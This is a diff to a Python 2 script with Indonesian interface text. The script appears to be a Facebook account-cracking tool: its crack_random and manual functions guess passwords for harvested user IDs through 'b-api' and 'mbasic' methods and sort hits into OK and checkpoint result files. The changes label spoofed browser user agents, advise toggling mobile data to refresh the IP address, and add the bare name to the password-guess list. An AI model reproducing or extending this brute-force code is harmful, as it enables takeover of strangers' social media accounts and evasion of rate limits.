@@ -813,8 +813,8 @@ def crack_random():
 			
 	print '\n %s[%s*%s] Total ID : %s%s%s' %(N,H,N,M,str(len(id)),N);time.sleep(2)
 	print ' %s[%s?%s] Pilih Metode Intip & Meotode Sandi Anda.'%(N,K,N)
-	print ' %s[%sT%s] Metode %sb-api %s(%sSandi Otomatis%s)'%(N,H,N,O,N,H,N)
-        print ' %s[%sY%s] Metode %smbasic %s(%sSandi Manual%s)'%(N,H,N,O,N,K,N)
+	print ' %s[%sT%s] Metode %sb-api %s(%sSandi Otomatis UA Opera Mini%s)'%(N,H,N,O,N,H,N)
+        print ' %s[%sY%s] Metode %smbasic %s(%sSandi Manual UA IE%s)'%(N,H,N,O,N,K,N)
 	ask = raw_input(' [%s?%s] Ingin menggunakan Metode [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
 	if ask == "Y" or ask == "y":
 		manual()  
@@ -822,7 +822,7 @@ def crack_random():
 	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
 	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
 	print ' %s=================================================='%(N)
-	print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar Stabil'%(M,N,M)
+	print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
 	print ' %s==================================================\n'%(N)
 	
 	def main(user):
@@ -837,6 +837,7 @@ def crack_random():
 				continue
 			else:
 				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+					pwx.append(ss)
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
 				else:
@@ -903,7 +904,7 @@ def manual():
 	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
 	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
 	print ' %s=================================================='%(N)
-	print ' [%s!%s] %sMatikan data selular untuk menjeda proses&\n Merefresh Cache IP Address agar Stabil'%(M,N,M)
+	print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
 	print ' %s==================================================\n'%(N)
 	
 	def main(user):
